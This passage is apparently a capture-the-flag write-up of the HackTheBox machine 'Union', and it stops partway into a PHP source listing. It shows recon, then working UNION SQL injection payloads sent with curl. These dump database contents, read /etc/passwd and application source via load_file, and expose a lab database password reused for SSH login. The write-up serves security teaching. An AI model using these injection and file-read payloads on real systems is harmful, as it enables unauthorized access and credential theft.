@@ -1,0 +1,517 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Union</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-union">htb-union</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#uhc">uhc</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#waf">waf</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#sqli-file">sqli-file</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#sudo">sudo</a> <a class="post-tag" href="/tags#iptables">iptables</a> <a class="post-tag" href="/tags#cpts-like">cpts-like</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-11-22T10:00:00+00:00" itemprop="datePublished">Nov 22, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/11/22/htb-union.html" style="color: #e6e6e6; text-decoration: none;">HTB: Union</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/union-cover.webp" type="image/webp"/>
+<img alt="Union" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/union-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>The November Ultimate Hacking Championship qualifier box is Union. There’s a tricky-to-find union SQL injection that will allow for file reads, which leaks the users on the box as well as the password for the database. Those combine to get SSH access. Once on the box, I’ll notice that www-data is modifying the firewall, which is a privileged action, using sudo. Analysis of the page source shows it is command injectable via the X-Forwarded-For header, which provides a shell as www-data. This account has full sudo rights, providing root access.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/418 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/union" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Union</a> <a href="https://hackthebox.com/machines/union" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-union.webp" type="image/webp"/> <img alt="Union" class="img-av" src="/icons/box-union.png"/></picture></a><br/><a href="https://hackthebox.com/machines/union" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">22 Nov 2021</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">22 Nov 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> ippsec</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found only one open TCP port, HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.128
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 08:29 EST
+Nmap scan report for 10.10.11.128
+Host is up (0.092s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.128
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 09:58 EST
+Nmap scan report for 10.10.11.128
+Host is up (0.089s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
+</span></code></pre></div></div>
+<p>NGINX version don’t tie as nicely with OS versions, so it’s hard to get a read on the OS version, beyond that it’s Ubuntu.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The website is about the UHC November Qualifiers:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119100020457.webp" type="image/webp"/>
+<img alt="image-20211119100020457" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119100020457.png"/>
+</picture>
+<p>If I enter my name and click check:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119100050512.webp" type="image/webp"/>
+<img alt="image-20211119100050512" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119100050512.png"/>
+</picture>
+<p>Interestingly, I later learned after looking at the page source the <code class="language-plaintext highlighter-rouge">0x</code> was a string that the filter (“WAF”) was matching on, so that’s a partial response. If I try some other username:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119160955072.webp" type="image/webp"/>
+<img alt="image-20211119160955072" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119160955072.png"/>
+</picture>
+<p>If I try the box creator, it gets a different message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119101604700.webp" type="image/webp"/>
+<img alt="image-20211119101604700" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119101604700.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The form creates a POST request to <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.128</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">9</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.128</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.128/</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=orpc54gjbbmaih8loabi2ru7bi</span>
+
+player=df
+</code></pre></div></div>
+<p>The response doesn’t show much:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Nov 2021 21:09:48 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">122</span>
+
+Congratulations df you may compete in this tournament!<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>Complete the challenge <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/challenge.php"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p>The site is setting a PHPSESSID cookie.</p>
+<h4 id="challengephp">/challenge.php</h4>
+<p>This path presents a new page that looks very similar to the previous one:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119100852069.webp" type="image/webp"/>
+<img alt="image-20211119100852069" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119100852069.png"/>
+</picture>
+<p>This time it’s asking for a flag. Submitting something returns the exact same page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119101132941.webp" type="image/webp"/>
+<img alt="image-20211119101132941" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119101132941.png"/>
+</picture>
+<p>I tried some basic fuzzing, but didn’t find anything useful.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.128 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.4.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.128
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.4.0
+ 💲  Extensions            │ [php]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       12w      178c http://10.10.11.128/css
+</span><span class="feroxbuster-green">200</span><span class="go">        0l        0w        0c http://10.10.11.128/config.php
+</span><span class="feroxbuster-green">200</span><span class="go">       42l       93w        0c http://10.10.11.128/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">       20l       61w        0c http://10.10.11.128/challenge.php
+</span><span class="feroxbuster-green">200</span><span class="go">        1l        2w        0c http://10.10.11.128/firewall.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    119996/119996  0s      </span><span class="feroxbuster-green">found</span><span class="go">:5       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   532/s   http://10.10.11.128
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   532/s   http://10.10.11.128/css
+
+</span></code></pre></div></div>
+<p>I already knew about <code class="language-plaintext highlighter-rouge">index.php</code> and <code class="language-plaintext highlighter-rouge">challenge.php</code>. <code class="language-plaintext highlighter-rouge">config.php</code> returns an empty response. This page is almost certainly being included by one or more of the other pages.</p>
+<p><code class="language-plaintext highlighter-rouge">firewall.php</code> returns a 200 OK, but it just says “Access Denied”.</p>
+<h2 id="shell-as-uhc">Shell as uhc</h2>
+<h3 id="detect-sql-injection">Detect SQL Injection</h3>
+<h4 id="failures">Failures</h4>
+<p>At first, this box will seem to be not vulnerable to SQL injection. Sending <code class="language-plaintext highlighter-rouge">player=0xdf'</code> returns the same message, as if it is handling the <code class="language-plaintext highlighter-rouge">'</code> just fine.</p>
+<p>Trying a similar payload with a player who gets the other result, <code class="language-plaintext highlighter-rouge">player=ippsec'</code> returns the message as if that user isn’t in the database. The form could be not vulnerable to SQL injection, or it could be handling errors the same as finding nothing.</p>
+<h4 id="identifying-small-difference">Identifying Small Difference</h4>
+<p>When I try to send <code class="language-plaintext highlighter-rouge">df'</code>, it returns with the error and the link:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211122120042188.webp" type="image/webp"/>
+<img alt="image-20211122120042188" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211122120042188.png"/>
+</picture>
+<p>When I try to add an <code class="language-plaintext highlighter-rouge">or</code>, it returns the same message, but no link:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211122120110983.webp" type="image/webp"/>
+<img alt="image-20211122120110983" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211122120110983.png"/>
+</picture>
+<p>This is slightly different, and something I should investigate further.</p>
+<h4 id="success">Success</h4>
+<p>To see if this is really injectable, I want to to give it a payload that will return the message that it’s not eligible, but for something that almost certainly isn’t in the DB.</p>
+<p>The query to the DB could look like:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="n">if</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'[user input]'</span><span class="p">;</span>
+</code></pre></div></div>
+<p>If that’s the case, passing in something like <code class="language-plaintext highlighter-rouge">ippsec';-- -</code> would return the same thing as <code class="language-plaintext highlighter-rouge">ippsec</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="n">if</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'ippsec'</span><span class="p">;</span><span class="c1">-- -';</span>
+</code></pre></div></div>
+<p>In fact, that works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119110357234.webp" type="image/webp"/>
+<img alt="image-20211119110357234" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119110357234.png"/>
+</picture>
+<p>That would only work if there is a user in the DB <code class="language-plaintext highlighter-rouge">ippsec';-- -</code> (which seems incredibly unlikely), or if I’ve successfully injected.</p>
+<h4 id="waf">“WAF”</h4>
+<p>This took me a bit longer to find because there’s some light filtering going on, likely to break <code class="language-plaintext highlighter-rouge">sqlmap</code>, but in a way that would not be an unrealistic implementation of a basic web application firewall (WAF).</p>
+<p>For example, it seems that <code class="language-plaintext highlighter-rouge">0x</code> actually triggers the WAF:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119111258068.webp" type="image/webp"/>
+<img alt="image-20211119111258068" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119111258068.png"/>
+</picture>
+<p>You can see that the same query that returned not elligible is now returning that the user can play, with only a change after the comment. That means that something is looking at the entire string and filtering it.</p>
+<p>In theory, I could send <code class="language-plaintext highlighter-rouge">player=df' or 1=1;-- -</code> and get rows back, but it doesn’t work:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119111413861.webp" type="image/webp"/>
+<img alt="image-20211119111413861" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119111413861.png"/>
+</picture>
+<p>It also doesn’t include the challenge link, which lines up with other cases where I’m being filtered. Just having “ or “ in the string triggers the filtering/WAF:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119111508530.webp" type="image/webp"/>
+<img alt="image-20211119111508530" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119111508530.png"/>
+</picture>
+<h3 id="union-injection">UNION Injection</h3>
+<h4 id="detection">Detection</h4>
+<p>In the example above, not only does it return data showing I successfully manipulated the SQL query, but it also displays back the name “ippsec”, not “ippsec’;– -“. That means what’s being displayed back when the username is found is the username from the database, not the username from the input (though from the developer’s point of view, those two would be the same).</p>
+<p>That means I can do a UNION injection to read data:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119111707394.webp" type="image/webp"/>
+<img alt="image-20211119111707394" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119111707394.png"/>
+</picture>
+<p>More interestingly:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119111734609.webp" type="image/webp"/>
+<img alt="image-20211119111734609" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119111734609.png"/>
+</picture>
+<h4 id="one-liner">One Liner</h4>
+<p>I’ll use this Bash one liner to query the DB:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select user();-- -"</span> 
+  | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> 
+  | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span>
+<span class="nb">echo</span>
+</code></pre></div></div>
+<p>This will get the result I’m looking for and remove the constant data that I don’t want. The extra <code class="language-plaintext highlighter-rouge">echo</code> is just to put a newline on the end.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select user();-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">uhc@localhost
+</span></code></pre></div></div>
+<h4 id="db-enumeration">DB Enumeration</h4>
+<p>There are five databases on the host, but really only <code class="language-plaintext highlighter-rouge">november</code> is interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">mysql,information_schema,performance_schema,sys,november
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">november</code> DB has two tables:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november';-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">flag,players
+</span></code></pre></div></div>
+<p>Interestingly, each table only has one column:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november';-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">flag:one,players:player
+</span></code></pre></div></div>
+<p>I can grab the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select group_concat(one) from flag;-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">UHC{F1rst_5tep_2_Qualify}
+</span></code></pre></div></div>
+<p>And also the list of users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select group_concat(player) from players;-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">ippsec,celesian,big0us,luska,tinyboy
+</span></code></pre></div></div>
+<h4 id="enter-flag">Enter Flag</h4>
+<p>With the flag, I can enter it on <code class="language-plaintext highlighter-rouge">challenge.php</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211119161426691.webp" type="image/webp"/>
+<img alt="image-20211119161426691" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211119161426691.png"/>
+</picture>
+<p>Where only 80 was open on initial <code class="language-plaintext highlighter-rouge">nmap</code>, now 22 is open as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22 10.10.11.128
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 16:14 EST
+Nmap scan report for 10.10.11.128
+Host is up (0.089s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
+</span></code></pre></div></div>
+<p>Also interesting, that POST request to <code class="language-plaintext highlighter-rouge">challenge.php</code> returned a 302 redirect to <code class="language-plaintext highlighter-rouge">firewall.php</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Nov 2021 21:14:18 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">/firewall.php</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+</code></pre></div></div>
+<p>It’s <code class="language-plaintext highlighter-rouge">firewall.php</code> that reports back that I have this access.</p>
+<h4 id="read-files">Read Files</h4>
+<p>SQL is configured with permissions to read files as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select load_file('/etc/lsb-release');-- -"</span> | <span class="nb">sed</span> <span class="s1">'s/Sorry, //'</span> | <span class="nb">sed</span> <span class="s1">'s/ you are not eligible due to already qualifying.//'</span><span class="p">;</span> <span class="nb">echo</span>
+<span class="go">DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=20.04
+DISTRIB_CODENAME=focal
+DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> gives a list of users on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select load_file('/etc/passwd');-- 
+</span><span class="go">-" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
+root:x:0:0:root:/root:/bin/bash
+...[snip]...
+htb:x:1000:1000:htb:/home/htb:/bin/bash
+...[snip]...
+uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
+</span></code></pre></div></div>
+<p>I can also read the page source:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.10.11.128 <span class="nt">-d</span> <span class="s2">"player=' union select load_file('/var/www/html/ind
+</span><span class="go">ex.php');-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
+&lt;?php                                                              
+  require('config.php');        
+</span><span class="gp">  if ( $</span>_SERVER[<span class="s1">'REQUEST_METHOD'</span><span class="o">]</span> <span class="o">==</span> <span class="s1">'POST'</span> <span class="o">)</span> <span class="o">{</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>I’m most interested in <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">firewall.php</code>. I’ll start with <code class="language-plaintext highlighter-rouge">config.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="nb">session_start</span><span class="p">();</span>
+  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span><span class="p">;</span>
+  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"uhc"</span><span class="p">;</span>
+  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"uhc-11qual-global-pw"</span><span class="p">;</span>
+  <span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"november"</span><span class="p">;</span>
+
+  <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>This is what handles the DB connection.</p>
+<h3 id="ssh">SSH</h3>
+<p>I’ve got usernames and now a password, and it happens those work together to get SSH access:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sshpass <span class="nt">-p</span> uhc-11qual-global-pw ssh uhc@10.10.11.128
+<span class="go">...[snip]...
+</span><span class="gp">uhc@union:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">uhc@union:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">bb0c4bf5************************
+</span></code></pre></div></div>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web-source">Web Source</h4>
+<p>With access as uhc, there’s not much new to access. I found myself looking at the web source. <code class="language-plaintext highlighter-rouge">challenge.php</code> is where I submitted the flag. It has the following logic:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">require</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
